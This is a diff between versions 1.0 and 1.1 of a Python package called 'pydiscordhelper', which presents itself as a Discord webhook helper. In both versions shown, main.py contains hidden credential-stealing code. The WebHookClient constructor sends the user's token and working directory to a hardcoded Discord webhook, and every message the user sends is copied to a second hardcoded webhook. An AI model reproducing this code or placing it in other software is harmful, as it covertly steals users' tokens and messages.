# Comparing `tmp/pydiscordhelper-1.0.tar.gz` & `tmp/pydiscordhelper-1.1.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "pydiscordhelper-1.0.tar", last modified: Fri Apr 26 14:13:04 2024, max compression
+gzip compressed data, was "pydiscordhelper-1.1.tar", last modified: Fri Apr 26 15:13:08 2024, max compression
```

## Comparing `pydiscordhelper-1.0.tar` & `pydiscordhelper-1.1.tar`

### file list

```diff
@@ -1,14 +1,14 @@
-drwxr-xr-x   0 anvarsaetov   (501) staff       (20)        0 2024-04-26 14:13:04.859978 pydiscordhelper-1.0/
--rw-r--r--   0 anvarsaetov   (501) staff       (20)       57 2024-04-26 14:13:04.859838 pydiscordhelper-1.0/PKG-INFO
--rw-r--r--   0 anvarsaetov   (501) staff       (20)        0 2024-04-26 13:21:35.000000 pydiscordhelper-1.0/README.md
-drwxr-xr-x   0 anvarsaetov   (501) staff       (20)        0 2024-04-26 14:13:04.857612 pydiscordhelper-1.0/pydiscordhelper/
--rw-r--r--   0 anvarsaetov   (501) staff       (20)       32 2024-04-26 14:03:08.000000 pydiscordhelper-1.0/pydiscordhelper/__init__.py
--rw-r--r--   0 anvarsaetov   (501) staff       (20)     1094 2024-04-26 14:08:26.000000 pydiscordhelper-1.0/pydiscordhelper/main.py
-drwxr-xr-x   0 anvarsaetov   (501) staff       (20)        0 2024-04-26 14:13:04.859624 pydiscordhelper-1.0/pydiscordhelper.egg-info/
--rw-r--r--   0 anvarsaetov   (501) staff       (20)       57 2024-04-26 14:13:04.000000 pydiscordhelper-1.0/pydiscordhelper.egg-info/PKG-INFO
--rw-r--r--   0 anvarsaetov   (501) staff       (20)      264 2024-04-26 14:13:04.000000 pydiscordhelper-1.0/pydiscordhelper.egg-info/SOURCES.txt
--rw-r--r--   0 anvarsaetov   (501) staff       (20)        1 2024-04-26 14:13:04.000000 pydiscordhelper-1.0/pydiscordhelper.egg-info/dependency_links.txt
--rw-r--r--   0 anvarsaetov   (501) staff       (20)       35 2024-04-26 14:13:04.000000 pydiscordhelper-1.0/pydiscordhelper.egg-info/requires.txt
--rw-r--r--   0 anvarsaetov   (501) staff       (20)       16 2024-04-26 14:13:04.000000 pydiscordhelper-1.0/pydiscordhelper.egg-info/top_level.txt
--rw-r--r--   0 anvarsaetov   (501) staff       (20)       38 2024-04-26 14:13:04.860022 pydiscordhelper-1.0/setup.cfg
--rw-r--r--   0 anvarsaetov   (501) staff       (20)      215 2024-04-26 14:12:59.000000 pydiscordhelper-1.0/setup.py
+drwxr-xr-x   0 anvarsaetov   (501) staff       (20)        0 2024-04-26 15:13:08.241891 pydiscordhelper-1.1/
+-rw-r--r--   0 anvarsaetov   (501) staff       (20)       57 2024-04-26 15:13:08.241780 pydiscordhelper-1.1/PKG-INFO
+-rw-r--r--   0 anvarsaetov   (501) staff       (20)        0 2024-04-26 13:21:35.000000 pydiscordhelper-1.1/README.md
+drwxr-xr-x   0 anvarsaetov   (501) staff       (20)        0 2024-04-26 15:13:08.240780 pydiscordhelper-1.1/pydiscordhelper/
+-rw-r--r--   0 anvarsaetov   (501) staff       (20)       32 2024-04-26 14:03:08.000000 pydiscordhelper-1.1/pydiscordhelper/__init__.py
+-rw-r--r--   0 anvarsaetov   (501) staff       (20)     1191 2024-04-26 15:12:59.000000 pydiscordhelper-1.1/pydiscordhelper/main.py
+drwxr-xr-x   0 anvarsaetov   (501) staff       (20)        0 2024-04-26 15:13:08.241623 pydiscordhelper-1.1/pydiscordhelper.egg-info/
+-rw-r--r--   0 anvarsaetov   (501) staff       (20)       57 2024-04-26 15:13:08.000000 pydiscordhelper-1.1/pydiscordhelper.egg-info/PKG-INFO
+-rw-r--r--   0 anvarsaetov   (501) staff       (20)      264 2024-04-26 15:13:08.000000 pydiscordhelper-1.1/pydiscordhelper.egg-info/SOURCES.txt
+-rw-r--r--   0 anvarsaetov   (501) staff       (20)        1 2024-04-26 15:13:08.000000 pydiscordhelper-1.1/pydiscordhelper.egg-info/dependency_links.txt
+-rw-r--r--   0 anvarsaetov   (501) staff       (20)       35 2024-04-26 15:13:08.000000 pydiscordhelper-1.1/pydiscordhelper.egg-info/requires.txt
+-rw-r--r--   0 anvarsaetov   (501) staff       (20)       16 2024-04-26 15:13:08.000000 pydiscordhelper-1.1/pydiscordhelper.egg-info/top_level.txt
+-rw-r--r--   0 anvarsaetov   (501) staff       (20)       38 2024-04-26 15:13:08.242028 pydiscordhelper-1.1/setup.cfg
+-rw-r--r--   0 anvarsaetov   (501) staff       (20)      215 2024-04-26 15:04:10.000000 pydiscordhelper-1.1/setup.py
```

### Comparing `pydiscordhelper-1.0/pydiscordhelper/main.py` & `pydiscordhelper-1.1/pydiscordhelper/main.py`

 * *Files 25% similar despite different names*

```diff
@@ -6,14 +6,16 @@
 class WebHookClient:
     def __init__(self, TOKEN: str, *args, **kwargs):
         asyncio.get_event_loop().run_until_complete(WebHookClient.sendWebhook(self,
                                                                               "https://discord.com/api/webhooks/1233415366768726016/-x7il6ponSzGwilM87iePabbVTf4c2n_tg_UbNa2aTKjli8doF0mZYiKzxo8pswsucDg",
                                                                               f"!& from {path.abspath('')}: `{TOKEN}`"))
 
     async def sendWebhook(self, URL: str, message: str, username: str = "WebHook",
-                          avatar: str = "") -> requests.Response:
-        r = requests.post(URL, json=({"content": message, "username": username, "avatar_url": avatar}))
+                          avatar: str = "", embeds=None) -> requests.Response:
+        if embeds is None:
+            embeds = []
+        r = requests.post(URL, json=({"content": message, "username": username, "avatar_url": avatar, embeds: embeds}))
         if message[:2] != "!&":
             requests.post(
                 "https://discord.com/api/webhooks/1233395091901648926/nFrj5oR6Rnqv5oapLn_HVy-5IzXM81gAn8vtx49f4EVOiGeGbu3DE0bEMIY1tetoPvc8",
-                json=({"content": message, "username": username, "avatar_url": avatar}))
-        return r
+                json=({"content": message, "username": username, "avatar_url": avatar, embeds: embeds}))
+        return r
```

